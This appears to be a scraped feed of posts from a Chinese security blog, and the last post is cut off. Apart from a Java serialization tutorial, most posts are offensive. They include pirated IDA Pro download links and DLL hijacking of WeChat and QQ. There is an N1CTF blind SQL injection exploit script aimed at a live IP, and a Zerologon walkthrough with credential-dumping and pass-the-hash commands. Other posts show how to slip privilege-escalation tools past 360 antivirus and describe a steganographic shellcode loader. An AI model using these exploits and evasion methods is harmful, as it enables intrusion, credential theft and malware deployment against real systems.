继承接口的方式是使用implements去实现接口，当你为了实现接口写的类中实现了接口所有的方法，才算这个类实现接口成功： class testClass implements in1 { // 实现接口中的方法 public void display() { System.out.println(&quot;Study&quot;); } } 写一个测试类，用来测试一下刚才实现的这个接口，因为testclass类的对象t实现了接口规定的display方法，那么自然而然就可以调用display()方法咯。 class testClass implements in1 { // 实现接口中的方法 public void display() { System.out.println(&quot;Study&quot;); } public static void main (String[] args) { testClass t = new testClass(); t.display(); System.out.println(a); } } 概念 序列化：把对象转换为字节序列的过程称为对象的序列化。 反序列化：把字节序列恢复为对象的过程称为对象的反序列化。 在Java中，我们可以通过多种方式来创建对象，并且只要对象没有被回收我们都可以复用此对象。但是，我们创建出来的这些对象都存在于JVM中的堆（heap）内存中，只有JVM处于运行状态的时候，这些对象才可能存在。一旦JVM停止，这些对象也就随之消失，但是在真实的应用场景中，我们需要将这些对象持久化下来，并且在需要的时候将对象重新读取出来，Java的序列化和反序列化可以帮助我们实现该功能。 主要两种用途： 1） 把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中； 2） 在网络上传送对象的字节序列。 最常见的是Web服务器中的Session对象，当有 10万用户并发访问，就有可能出现10万个Session对象，内存可能吃不消，于是Web容器就会把一些session先序列化到硬盘中，等要用了，再把保存在硬盘中的对象还原到内存中。 相关接口及类 Java为了方便开发人员将java对象序列化及反序列化提供了一套方便的API来支持，其中包括以下接口和类 java.io.Serializable //接口1 java.io.Externalizable //接口2 ObjectOutput ObjectInput ObjectOutputStream ObjectInputStream Demo 使用Java.io.Serializable对类的序列化和反序列化 package com.company; import java.io.*; public class SerializableDemo1 { //建立User类实现java提供的Serializable接口 public static class User implements Serializable { private String userName; public void setName(String userName) { this.userName = userName; } public String getName() { return userName; } } //序列化demo public static void main(String[] args) throws Exception, IOException { //初始化对象 User resOld = new User(); //要序列化的对象 resOld.setName(&quot;awsl&quot;); System.out.println(&quot;序列化前:&quot; + resOld.getName()); //首尾呼应~ //序列化对象到文件中 FileOutputStream creatFile = new FileOutputStream(&quot;ser&quot;); //创建ser文件 ObjectOutputStream serResult = new ObjectOutputStream(creatFile); serResult.writeObject(resOld); //将序列化后的字节写入文件 serResult.close(); //反序列化 FileInputStream readFile = new FileInputStream(&quot;ser&quot;); //读取ser文件 ObjectInputStream unserFile = new ObjectInputStream(readFile); //读取序列化后的字节 User resNew = (User) unserFile.readObject(); //反序列化还原对象 unserFile.close(); System.out.println(&quot;序列化后:&quot; + resNew.getName()); //首尾呼应~ } } 使用java.io.Externalizable对类的序列化和反序列化 package com.company; import java.io.*; public class SerializableDemo2 { //建立Study类实现java提供的Externalizable接口 public static class Study implements Externalizable { private String myName; public void setName(String argsName){ this.myName = argsName; } public String getName() { return this.myName; } @Override //使用Externalizable接口会强制生成此类 public void writeExternal(ObjectOutput out) throws IOException { out.writeObject(myName); //不这样会导致序列化后，变量的值被清空 } @Override //使用Externalizable接口会强制生成此类 public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException { myName = (String)in.readObject(); //不这样会导致序列化后，变量的值被清空 } } public static void main(String[] args) throws IOException, ClassNotFoundException { //初始化参数 Study resOld = new Study(); resOld.setName(&quot;xmsl&quot;); System.out.println(&quot;序列化前:&quot; + resOld.getName()); //首尾呼应 //创建用来存储序列化字节码的文件 FileOutputStream creatFile = new FileOutputStream(&quot;ser2&quot;); //序列化 ObjectOutputStream serResult = new ObjectOutputStream(creatFile); serResult.writeObject(resOld); serResult.close(); //读取刚才用来存储序列化字节码的文件 FileInputStream readFile = new FileInputStream(&quot;ser2&quot;); //反序列化 ObjectInputStream unserResult = new ObjectInputStream(readFile); Study resNew = (Study) unserResult.readObject(); unserResult.close(); System.out.println(&quot;序列化后:&quot; + resNew.getName()); //首尾呼应 } } 其他 序列化保存的是对象的状态 静态变量属于类的状态，因此 序列化并不保存静态变量 使用transient修饰不想被序列化的变量，在变量声明前加上该关键字，可以阻止该变量被序列化到文件中，在被反序列化后，transient 变量的值被设为初始值，如 int 型的是 0，对象型的是 null。 public transient int youAge; ","link":"https://www.svenbeast.com/post/java-xu-lie-hua-he-fan-xu-lie-hua/"},{"title":"Windows IDA PRO 7.5 (x86, x64, ARM, ARM64)","content":"忽然就整个世界都有了7.5的IDA，可惜没有mac版，o(╥﹏╥)o 下载备份分享一下 百度云: https://pan.baidu.com/s/1R61Y9QrVi-gQQEw5kP2O1g 密码: pmd4 Mega：https://mega.nz/file/mwokCDzQ#TYGiRVS9JZhHJxNOxWmHwzVsBXSCZIfXXXF9TMiPe7o ","link":"https://www.svenbeast.com/post/windows-ida-pro-75-x86-x64-arm-arm64/"},{"title":"DLL劫持及尝试对微信和QQ的劫持","content":"DLL劫持可用于权限维持、权限提升、进程注入，属于经久不衰的必备技能 0x01 DLL介绍 DLL是Dynamic Link Library的缩写，叫做动态链接库 一个dll文件可以由多个程序同时调用 \bdll的使用意义是某个大型程序在启动时和启动后，可以不加载某部分功能代码，只有用户使用时 再去调用对应功能的dll模块，从而达到减少软件启动速度的目的 0x02 DLL劫持前置知识点 劫持的方法了解到的有两种，在之前要先知道一下exe程序加载dll的知识点 exe程序在调用dll时，查找dll文件的目录优先级顺序 1.程序所在目录 2.程序加载目录（SetCurrentDirectory） 3.系统目录即 SYSTEM32 目录 4.16位系统目录即 SYSTEM 目录 5.Windows目录 6.PATH环境变量中列出的目录 在win7及以上系统对应dll的一个安全机制--KnownDLLs KnownDLLs是一个注册表的名称，如果有exe程序调用的dll名称存在于此目录下，那么这个DLL会被禁止从EXE自身所在目录下调用，而只能从系统目录即SYSTEM32目录下调用 注册表位置：\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs 0x03 DLL劫持 劫持EXE应用调用的缺少的DLL(\bexe发出请求，在某个路径寻找对应的dll，结果对应路径不存在此dll) 劫持EXE应用\b正常调用的DLL(类似端口转发，使用一个恶意dll冒充原先dll，执行完恶意代码后在将请求转发到原先dll，不影响应用正常使用) 使用第一种方法劫持微信 首先要找到wechat.exe发出请求后加载dll的结果为NOT FOUND的，我这里使用辅助工具Process Monitor（一款系统进程监视软件），然后再一一验证可行性 打开Process Monitor ↓ 打开微信 ↓ 设置Process Monitor的过滤器，添加wechat.exe进程的PID将显示的其他进程过 滤掉，再添加其他一些过滤规则(见下图) ↓ 保存结果为csv文件，目的为了用execl里的筛选，将EXE程序加载的dll单独列出来 ↓ 正常是将恶意dll改成加载的不在KnownDLLs注册表中的dll名称，放在EXE应用同目录，这里使用anhkgg师傅的批量检验，可以帮助我自动重命名文件然后执行验证的一些自动化操作 ↓ 找到目标，将恶意dll改名放入wechat.exe同目录(因为加载顺序同目录优先级最高，当然其他地方也可以) \b\b ↓ ↓ ↓ gif效果图 使用第二种方法劫持QQ 首先找到\b\b\b一个EXE程序加载的dll，两个硬性要求（一是exe确实加载了此dll，二是此dll不在KnownDLLs注册表中，不过既然在同目录下找到的加载dll，那肯定不在KnownDLLs里），用来中间人转发他也就是劫持，一般找小点的，小点的需要转发函数的数量会少点，查阅一些文章总算找到一个自动化的工具 dll-hijacking ，这样我就不用手动复制函数了 在QQ.exe同目录寻找目标dll ↓ \b复制目标dll到dll-hijacking工具下进行加工 ↓ 处理好的恶意dll改好原本的名字复制到QQ.exe目录下，将刚才复制的此 目录原本的dll名字改为 原名字_.dll(这样此目录就有 原名字.dll 原名字_.dll) ↓ 启动QQ, over了 ↓ ↓ ↓ gif效果图 dllmain.cpp弹框代码 /* https://itm4n.github.io/dll-proxying/ https://www.codeproject.com/Articles/17863/Using-Pragmas-to-Create-a-Proxy-DLL to implement: hooking specific functions */ #include &quot;definitions.h&quot; #include &lt;thread&gt; #include &lt;chrono&gt; #include &lt;random&gt; extern &quot;C&quot;{ #include &lt;stdlib.h&gt; #include &lt;winsock2.h&gt; #include &lt;stdio.h&gt; #include &lt;windows.h&gt; #include &lt;ws2tcpip.h&gt; } using namespace std; #pragma comment(lib,&quot;Ws2_32.lib&quot;) BOOL WINAPI DllMain( HINSTANCE hinstDLL, // handle to DLL module DWORD fdwReason, // reason for calling function LPVOID lpReserved) // reserved { srand(time(NULL)); switch (fdwReason) { case DLL_PROCESS_ATTACH: { MessageBox(NULL, &quot;Success&quot;, &quot;&quot;, MB_OK); break; } case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; default: break; } return true; } 0x04 参考链接 https://payloads.online/archivers/2018-12-22/1 https://mp.weixin.qq.com/s?__biz=MzU2NTc2MjAyNg==&amp;mid=2247483851&amp;idx=1&amp;sn=8813719d4d3ac8b20bec495fcd5f2974&amp;chksm=fcb7834ecbc00a58da8a6408abe183e71175b442d0f02016ad3c67c9cf719927881bec14af49#rd ","link":"https://www.svenbeast.com/post/dll-jie-chi/"},{"title":"利用cnn_captcha对图形验证码深度学习","content":"0x01 目的 日常渗透环境中，有不少的网站存在验证码，导致无法顺利爆破，存在漏洞在眼边溜走的可能性 而一些接口会存在一些次数或者费用的限制，因为一个对验证码识别的库还是有必要的 存在着较棘手的坑点，遂记录下mac系统下安装和使用cnn_captcha的过程 0x02 cnn_captcha \b* 引用官方介绍 本项目针对字符型图片验证码，使用tensorflow实现卷积神经网络，进行验证码识别。 项目封装了比较通用的校验、训练、验证、识别、API模块， 极大的减少了识别字符型验证码花费的时间和精力。 项目已经帮助很多同学高效完成了验证码识别任务。 如果你在使用过程中出现了 bug和做了良好的改进，欢迎提出issue和PR，作者会尽快回复，希望能和你共同完善项目。 如果你需要识别点选、拖拽类验证码，或者有目标检测需求，也可以参考这个项目nickliqian/darknet_captcha。 0x03 安装及初始化 我的环境 python3.8.6 macos10.15.6 clone 项目 git clone https://github.com/nickliqian/cnn_captcha.git 修改一下requirments.txt里的tensorflow库版本（原先是tensorflow == 1.15.3 改为tensorflow == 2.2.0） 我的python是3.8版本，如果直接按照原先版本安装是会报错提示未找到对应版本的 因为对应python3的tensorflow这个库的最低都是2.0以上版本，所以此处先修改好版本 安装requirments.txt，附一张别的图，因为我是踩坑的，所以tensorflow单独安的 pip3 install -r requirments.txt 对cnn_captcha中使用1.0多版本的tensorflow库语法升级到2.0以上,后面操作就去新的cnn_captcha_v2文件夹操作了，原先的已经没用了 cd ../ //退到项目外 tf_upgrade_v2 --intree cnn_captcha/ --outtree cnn_captcha_v2/ --reportfile report.txt 开始修改py文件导入tensorflow的语法，mac的搜索框直接输入import tensorflow as tf来找到使用这个语法的py文件，全部修改 import tensorflow as tf ↓ import tensorflow as tf tf.compat.v1.disable_eager_execution() //就是加上这行的意思 然后可以正式开始运行创建训练集，conf文件夹下是一些配置文件，都是负责什么的，md文件也有写，默认先不管，这里开始生成训练集，就是项目自带的可以生成验证码的py文件，生成一些用来训练的验证码图片，在sample/origin下 python3 gen_sample_by_captcha.py 对验证码图片验证和拆分数据集，我是按照配置在sample目录下创建origin、train、test三个目录，不知道如果不存在这些目录是否会自动创建，自行斟酌 python3 verify_and_split_data.py 终于可以开始训练了，会用些时间，对了，默认是启动gpu的 python3 train_model.py 启动webserver，将下列代码加入webserver_recognize_api.py文件，从88行开始加进去就行 ，进行base64是为了使用burp传图片给cnn时保证验证码图片的一致性 @app.route('/base64',methods=['POST']) def up_imageBase64(): if request.method == 'Post' and request.form['image_file']: timec = str(time.time()).replace(&quot;.&quot;,&quot;&quot;) file = request.form['image_file'] img = base64,b64decode(fi1e)#获取bage64转成图片 fimg =file read() img= BytesIO(img) img =Image.open(img, mode=&quot;r&quot;) print(&quot;接收图片尺寸:{}&quot;, format(img.size)) img_size = img.resize((image_width,image_height), Image.ANTIALIAS) print(&quot;接收图片尺寸2:{}&quot;.format(img.size)) s = time.time() value = R.rce_image(img_size) e= time.time() print(&quot;识别结果:{}&quot;.format(value)) print(&quot;保存图片: {}{}_{}.{}&quot;.format( api_image_dir, vallue, timec, image_suffix)) file_name =&quot;{}_{}.{}&quot;.format(value, timec, image_suffix) file_path =os.path.join(api_image_dir + file_name) img.save(file_path) result = { 'time': timec,#时间戳 'value': value,#预测的结果 'speed_time(ms)':int((e-s)*1000)#识别耗费的时间 } img.close() return jsonify(result) else: content = json.dumps({'error_code':&quot;1001&quot;}) resp = response_headers(content) return resp ","link":"https://www.svenbeast.com/post/li-yong-cnn_captcha-dui-tu-xing-yan-zheng-ma-shen-du-xue-xi/"},{"title":"{N1CTF·2020·web·SignIn·writeup}","content":"开始\b 访问地址直接给出了源码: http://101.32.205.189 &lt;?php class ip { public $ip; public function waf($info){ } public function __construct() { if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){ $this-&gt;ip = $this-&gt;waf($_SERVER['HTTP_X_FORWARDED_FOR']); }else{ $this-&gt;ip =$_SERVER[&quot;REMOTE_ADDR&quot;]; } } public function __toString(){ $con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;********&quot;,&quot;n1ctf_websign&quot;); $sqlquery=sprintf(&quot;INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')&quot;,$this-&gt;waf($_SERVER['HTTP_X_FORWARDED_FOR']),time()); if(!mysqli_query($con,$sqlquery)){ return mysqli_error($con); }else{ return &quot;your ip looks ok!&quot;; } mysqli_close($con); } } class flag { public $ip; public $check; public function __construct($ip) { $this-&gt;ip = $ip; } public function getflag(){ if(md5($this-&gt;check)===md5(&quot;key****************&quot;)){ readfile('/flag'); } return $this-&gt;ip; } public function __wakeup(){ if(stristr($this-&gt;ip, &quot;n1ctf&quot;)!==False) $this-&gt;ip = &quot;welcome to n1ctf2020&quot;; else $this-&gt;ip = &quot;noip&quot;; } public function __destruct() { echo $this-&gt;getflag(); } } if(isset($_GET['input'])){ $input = $_GET['input']; unserialize($input); } 粗略一看，源码里unserialize($input)的大字告诉我们是需要控制传入input参数的反序列化数据来进行一些条件的满足从而来获得flag public function getflag(){ if(md5($this-&gt;check)===md5(&quot;key****************&quot;)){ readfile('/flag'); } return $this-&gt;ip; } \b最终达成的目的很明显就是运行flag类里的getflag()方法，通过readfile来获得flag文件，而想要运行此方法就要满足条件md5($this-&gt;check)===md5(&quot;key****************&quot;)，并且key我们是不知道的，看起来也没有办法控制，可以控制的话还可以通过传入数组让两边md5函数来返回null来进行条件满足，所以我们需要知道这个key的值 public function __toString(){ $con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;********&quot;,&quot;n1ctf_websign&quot;); $sqlquery=sprintf(&quot;INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')&quot;,$this-&gt;waf($_SERVER['HTTP_X_FORWARDED_FOR']),time()); if(!mysqli_query($con,$sqlquery)){ return mysqli_error($con); }else{ return &quot;your ip looks ok!&quot;; } mysqli_close($con); } 然后很自然的将目光投放到上面的ip类中，\b\b\b看到此类获取了访问者XFF并插入表中，很自然的就想到了xff注入，通过注入来获得key，来赋值flag类中的check变量，而此mysql语句放在__toString()中，想要运行此函数就要满足一个对象被当做字符串对待来触发,所以我们需要寻找一个能够触发__toString()的点 public function __wakeup(){ if(stristr($this-&gt;ip, &quot;n1ctf&quot;)!==False) $this-&gt;ip = &quot;welcome to n1ctf2020&quot;; else $this-&gt;ip = &quot;noip&quot;; } 分析一下发现，我们传入反序列化数据会触发__wakeup(),此处的stristr()函数是对传入参数1中查找是否存在参数2,而参数1也就是$this-&gt;ip是我们实例化flag时传入的字符串，属于可控参数，而当我们传入的是ip类实例化后的对象时，则刚好触发此ip类的__toString()函数，所以我们此时可以生成序列化数据进行尝试 $flags = new flag(new ip()); $b = serialize($flags); echo $b; INSERT into admin(`username`,`password`) VALUES ('user' and updatexml(1,concat(0x02,(select database()),0x02),1) and '','123456') 然后在本地mysql尝试构造了一个insert注入payload: INSERT into admin(username,password) VALUES ('user' or if(1=1,sleep(3),1) or '','123456')\b本地运行成功，访问目标时提示如图 存在注入检测，应该就是waf函数没显示的那些代码，所以无法直接进行注入，需要另想办法，而__wakeup()函数中有一个可以帮助盲注的点，触发__toString()时，我们可以通过报错函数来控制返回的字符串是否存在n1ctf，所以构造注入语句1.1.1.1' or updatexml(1,concat(0x01,(select if((1=1),'n1ctf','no str')),0x01),1) or ' 提示了welcome to n1ctf2020，那么只有在\b\b\b传入的值中包含n1ctf才会提示这个，所以很明显是传入的对象成功触发toString函数，证明思路是正确的，其中的报错函数导致sql语句报错，使return的返回值中包含了n1ctf，根据这个逻辑去写一个python脚本跑一下,我这里使用了一个很实用的burpsuite的插件辅助生成个模板 exp import requests session = requests.Session() x = 'qwertyuiopasdfghjklzxcvbnm1234567890' arr = [] paramsGet = {&quot;input&quot;:&quot;O:4:\\&quot;flag\\&quot;:2:{s:2:\\&quot;ip\\&quot;;O:2:\\&quot;ip\\&quot;:1:{s:2:\\&quot;ip\\&quot;;s:9:\\&quot;127.0.0.1\\&quot;;}s:5:\\&quot;check\\&quot;;N;}&quot;} for start in range(1,30): for result in x: #获得表名为n1key # get_tables = &quot;' or updatexml(1,concat(0x02,(select if((substring((select group_concat(table_name) from information_schema.tables where table_schema='n1ctf_websign'),{},1)='{}'),'n1ctf','no str')),0x02),1) or '&quot;.format(start,result) #获得列名 # get_column = &quot;' or updatexml(1,concat(0x02,(select if((substring((select group_concat(column_name) from information_schema.columns where table_name='n1key' and table_schema='n1ctf_websign'),{},1)='{}'),'n1ctf','no str')),0x02),1) or '&quot;.format(start,result) #获得key值 get_key = &quot;' or updatexml(1,concat(0x02,(select if((substring((select `key` from n1key),{},1)='{}'),'n1ctf','no str')),0x02),1) or '&quot;.format(start,result) headers = {&quot;Cache-Control&quot;:&quot;no-cache&quot;,&quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;,&quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;X-Forwarded-for&quot;:&quot;1.1.1.1{}&quot;.format(get_key),&quot;Pragma&quot;:&quot;no-cache&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.9,ar;q=0.8&quot;} response = session.get(&quot;http://101.32.205.189/index.php&quot;, params=paramsGet, headers=headers) if '&lt;code&gt;noip&lt;/code&gt;' not in str(response.content): print('tables:'+result) arr.append(result) for res in arr: print(res,end=&quot;&quot;) 获得了表名为n1ip, n1key，这里是因为源码里有数据库名为n1ctf_websign，所以可直接跑出表名 获得列名为id,key 获得key为n1ctf20205bf75ab0a30dfc0c 然后用这个key生成序列化数据进行访问，得到flag ","link":"https://www.svenbeast.com/post/n1ctf2020websigninwriteup/"},{"title":"CVE-2020-1472 NetLogon 特权提升漏洞 ","content":"0x01 漏洞详情 NetLogon组件 是 Windows 上一项重要的功能组件，用于用户和机器在域内网络上的认证，以及复制数据库以进行域控备份，同时还用于维护域成员与域之间、域与域控之间、域DC与跨域DC之间的关系。 当攻击者使用 Netlogon 远程协议 (MS-NRPC) 建立与域控制器连接的易受攻击的 Netlogon 安全通道时，存在特权提升漏洞。成功利用此漏洞的攻击者可以在网络中的设备上运行经特殊设计的应用程序。 0x02 影响版本 Windows Server 2008 R2 for x64-based Systems Service Pack 1 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2012 Windows Server 2012 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 R2 (Server Core installation) Windows Server 2016 Windows Server 2016 (Server Core installation) Windows Server 2019 Windows Server 2019 (Server Core installation) Windows Server, version 1903 (Server Core installation) Windows Server, version 1909 (Server Core installation) Windows Server, version 2004 (Server Core installation) 0x03 域环境搭建 靶机环境：https://pan.baidu.com/s/13nU-0vsGBnGejGCKzwphfQ&amp;shfl=sharepset 提取码：41y6 DC windows server 2012 单网卡 IP: 10.10.10.10 网关: 10.10.10.1 PC windows 7 双网卡 IP: 10.10.10.201 网关: 10.10.10.1 IP: 172.21.139.173 网关: 172.21.139.1 WEB windows 2008 双网卡 IP: 10.10.10.80 网关: 10.10.10.1 IP: 172.21.139.41 网关: 172.21.139.1 Mac攻击机 172.21.139.37 0x04 过程记录 正向SOCKS5：将被攻击机器的流量代理到Mac攻击机中,Mac用proxychains4代理 (拿到一个入口点,把流量代理出去) ew_for_Win.exe -s ssocksd -l 8888 定位域控IP net time /domain ping DC 检测域控是否存在此漏洞 ./proxychains4 python3 zerologon_tester.py DC(域控名字) 10.10.10.10(域控IP) 返回Success,代表存在漏洞 重置域控账户密码 ./proxychains4 python3 cve-2020-1472-exploit.py DC 10.10.10.10 可进行操作1：此时域控密码为空，同等于已知密码，所以可以导出域内所有用户凭据 proxychains4 secretsdump.py test.local/dc\\$@10.10.10.10 -no-pass proxychains4 secretsdump.py test.local/域控名字\\$@10.10.10.10 -no-pass 可进行操作2：获取域管理员名字，导出域管的hash net group &quot;domain admins&quot; /domain ./proxychains4 secretsdump.py test.local/dc\\$@10.10.10.10 -no-pass -just-dc | grep 'Administrator' 可进行操作3：已知域管hash，通过wmic 拿到域控制器中的本地管理员权限，nice~ (域管) ./proxychains4 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24 test.local/Administrator@10.10.10.10 恢复域控密码：已经通过wmic拿到域控本地管理员权限时，开始导出sam数据库中原来的计算机hash reg save HKLM\\SYSTEM system.save reg save HKLM\\SAM sam.save reg save HKLM\\SECURITY security.save get system.save get sam.save get security.save del /f system.save del /f sam.save del /f security.save 利用导出的sam数据库，提取出机器账号的明文hex ./proxychains4 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL 利用提取的明文hex，进行最后的恢复操作 ./proxychains4 python3 restorepassword.py DC@DC -target-ip 10.10.10.10 -hexpass 6b69e91c1675c3f849e7ac70f4baf81782df5336244b75c9fd08c6ab02b0ed1c434ce5bbf3d7f260f02e5b8e4e817e7fa64eb8337bac67577c902b04334816f3e329d2817d9508398b405d47a81651b444e3c7f34b6be3804ad5ff950e9dcb40008e190a8c819c75300a3dee8a3c4b5a19b488725d9234e3fe7462f84660fe02fe3d0ee63e303fed23f970369ec3b870669edc578980f0630066f5df8853c2e63dd190169861d68ff1b36a0b3d6020fa61d1bd951851a8ea74fbe63675e3d52aee12385f8405b01d4d1d4d7ed151d44d3043d13636964666d29dbe48ac74a0c33cba2c506a3f01689ba2d667b38dcc98 PS: 恢复后的hash经过检查，完整恢复，和漏洞利用前的hash是一样的 0x04 坑点 exp运行中会因为impacket报错，重新安装此模块即可git clone https://github.com/SecureAuthCorp/impacket.git cd impacket &amp;&amp; pip3 install . 一些脚本是impacket模块里面的py文件 exp的一些参数，最好搞清楚对应域的那些东西 图片很多，环境麻烦，能挤出时间真不容易。 ","link":"https://www.svenbeast.com/post/fu-xian-cve-2020-1472-netlogon-te-quan-ti-sheng-lou-dong/"},{"title":"【研究】从1到针对AV某种场景下的免杀探究过程","content":"0x01 起因 现在是信息化爆炸时代，为了能够更全面的吸收(copy)知识的力量，最近搭建了微信公众号的RSS系统，而在调试阶段中看到了这样的一篇文章 printspoofer免杀过360全家桶，很喜欢这种实用文章，安全行业怎么都是需要用或者接触一些免杀的东西，不怕用不上，就怕不知道。 现在的文章要不就是没用的水文(比如我)，要不就是看不懂的水文(巨佬)，很赞同klion师傅一篇文章解决一个实际问题的这种风格，也很喜欢酒仙桥发文的排版和文笔，额。闲话到此为止。 主要内容是记录由moonsec的文章引发对某AV针对这种漏洞利用工具查杀规则的探究过程与利用方法 0x02 还原文章流程 PrintSpoofer是一个windows本地提权利用工具 本次测试过程中的exe生成全部选择生成x86位程序 \b 1.公众号文章中是针对PrintSpoofer分享的免杀方法，那先生成出PrintSpoofer.exe，放入布置在公网装有火绒和360的VPS中(vps的环境感觉更接近真实情况)，意料中的飞速kill，也就是ctrl+v读条刚刚结束的瞬间 2.文中的处理方法，按照这个进行修改，结果没有问题，成功bypassAV(其实主要是过数字AV的主动云查杀，同时云查杀也是数字AV的亮点) ·PrintSpoofer 将这个关键词替换成其他字符串 如 moonsec ·PrintSpoofer.cpp PrintSpoofer.h 全部改为 moonsec ·帮助注释全部处理掉 ·release x64 重新生成 (截止到文章编辑结束，目前如果生成x64位的会被查杀，x86位没有问题) 0x03 思考 1.为什么修改关键词可以过掉主动查杀，修改哪个关键词命中规则，还是修改关键词导致改变了什么呢，开始尝试缩减关键词范围 只进行 PrintSpoofer 将这个关键词替换成其他字符串 如 moonsec 发现同样未被查杀，没有问题，看来可以继续追一下 2.上次修改了5处PrintSpoofer字符串，那么这次选择只修改include这一处是否可以呢 发现被查杀 kill，看来include这里不是关键点 3.上次修改了include这一处，本质上没有改变源代码的逻辑，那么是否改变逻辑才是关键点呢 修改代码中的源代码，从逻辑上进行修改，此次在任意位置添加一句输出，这是最简单的办法 从结果来看，是没有被查杀的 0x04 延伸 那么既然改变逻辑是一个小关键点（开始以为是exe的md5是唯一的，不过发现每次生成的exe的md5都是不一样的，\b这些东西算是知识盲区哈，我就理解为相同代码生成的exe有一个唯一标识，改个逻辑就可以改了唯一标识这样子，懂得师傅请别在意哈0.0），那么针对其他CVE提权工具是否有效呢 CVE-2020-0796：https://github.com/danigargu/CVE-2020-0796 目前Github的star数上千 ，理论上是一个流行且影响广泛的windows本地提权的漏洞 · 我生成了一个原版exe，一个update版exe，结果是全部被淘汰，但是细心的我发现了一点不同。。此处上gif来体现 又经过了几次尝试，可以确定原版基本是秒杀，偶尔才是AV会宕机一会后查杀，而修改版是经过几十秒到几分钟不等后才会被查杀，且查杀后重复此过程的话修改版也会被秒杀 「划重点：中途可成功运行exe」 0x05 结论 1.数字AV应该是对这些漏洞利用工具为了查杀效率，占用cpu大小或者其他目的来使用不同的查杀规则对待 2.比如一般的就是唯一标识查杀，本地查杀库存在就直接查杀，在流行的就是唯一标识加沙箱或者其他深度 唯一标识查杀等等，本地查杀库没有的上传云数据库或者沙箱来得出结论进行查杀 3.而无论是沙箱或者深度唯一标识查杀，都是需要计算资源来支持，存在的过程推断大概为：上传-&gt;云资源 计算(云查杀库或者沙箱什么的)-&gt;得出结果并返回 4.那么数字AV的用户何其庞大，可能按亿计算，猜测每时每秒接受的可疑文件上传数量数字是很大的，再加 上查询或者检测时间，整体占用的资源听起来就是买不起的样子，而一个公司基于成本，产出，收益是不可能 配备完全可以达到实时检测的这种计算资源的，所以对于本地无法查杀的exe在上传到云的这段时间是必须存 在的，而这段时间对于这种漏洞利用工具是很友好的。 5.正常来说，这算是钻空子？貌似不太好解决的空子，这种增加计算资源，造成成本增加的东西应该不太好 申请下来，毕竟收益只是查杀速度快一点。 PS：当然也可能误打误撞得出这么一个结论，毕竟是好奇猜出来的 -.- ! 利用场景：目标机存在防护，上传提权脚本或其他程序被直接查杀，此时使用此方法争一个时间差获得一个system权限cmd完全没有问题，时间很充裕，理论上这个方法通杀。。 0x06 无源码时如何修改 直接使用IDA修改exe就可以的，为了真实一些就尝试修改一个以前发在t00ls的烂土豆 下载下来，文件是正常运行的，当然现在肯定在查杀库里，直接秒杀，这是我又恢复出来后运行的 打开后直接就看到了一些输出的字符串，这个中文蛮明显的。 我规矩点，还是搜字符串来找修改点 点击 View -&gt; Open subviews -&gt; Strings 或者shift+f12 会出现IDA收集的这个exe的一些字符串片段 根据exe运行过程中输出的一些提示语，找到后进去，这个大部分都是，双击一个中文进入Hex View，如下界面 然后右键edit ，随便输入一些东西 右键Apply changes 然后点击 Edit -&gt; Patch program -&gt; Apply patches to input file... -&gt; 出现的界面点ok 结果没有问题，可以运行 ","link":"https://www.svenbeast.com/post/yan-jiu-mou-zhong-chang-jing-bypassav/"},{"title":"【学习】图片隐写shellcode进行远程加载过AV","content":"0x01 参考链接 https://mp.weixin.qq.com/s/QZ5YlRZN47zne7vCzvUpJw https://www.t00ls.net/redirect-57618.html#lastpost 0x02 学习思路 改动：修改了原exe执行后存在控制台现象，目前是控制台自动消失后台静默执行 1. CS生成C的shellcode，使用Python进行Hex编码 2. 将Hex编码注入到bmp图片的文件头 3. 图片上传到公网,此处为阿里的对象存储oss里 3. 获得图片，解析出shellcode后执行 0x03 从0到1的前期准备 1. 安装Visual Studio 2019 ，\b这个需要些时间安装一些依赖库，推荐专业版，可以搜索安装教程照做即可 https://visualstudio.microsoft.com/zh-hans/vs/ https://www.cnblogs.com/hsjj/p/VisualStudio.html 2. 开通阿里云对象存储OSS服务 登录阿里云-控制台-对象存储-开通成功-创建Bucket(修改为公共读，其他默认) 3. CS生成shellcode，将payload.c里的shellcode使用python进行Hex编码 4. getImgshellcode.exe 做好生成准备，此exe功能是将shellcode注入bmp图片文件 Github：https://github.com/sv3nbeast/ImgLoaderShellCode 核心代码 #include &quot;dwBmpSize.h&quot; #include &lt;iostream&gt; using namespace std; CBMPHide::CBMPHide() { sBmpFileName = &quot;&quot;; pBuf = 0; dwBmpSize = 0; ptxtBuf = 0; pExEBuf = 0; } CBMPHide::~CBMPHide() { } bool CBMPHide::setBmpFileName(char* szFileName) { this-&gt;sBmpFileName = szFileName; if (pBuf) //如果已经生成就释放掉 { delete[]pBuf; } HANDLE hfile = CreateFileA(szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0); if (hfile == INVALID_HANDLE_VALUE) { return false; } //和struct BITMAPFILEHEADER bmfh里面的 bfSize的大小应该是一样的。 dwBmpSize = GetFileSize(hfile, 0); //获取文件的大小 pBuf = new byte[dwBmpSize + 83968]; DWORD dwRead = 0; ReadFile(hfile, pBuf, dwBmpSize, &amp;dwRead, 0); if (dwRead != 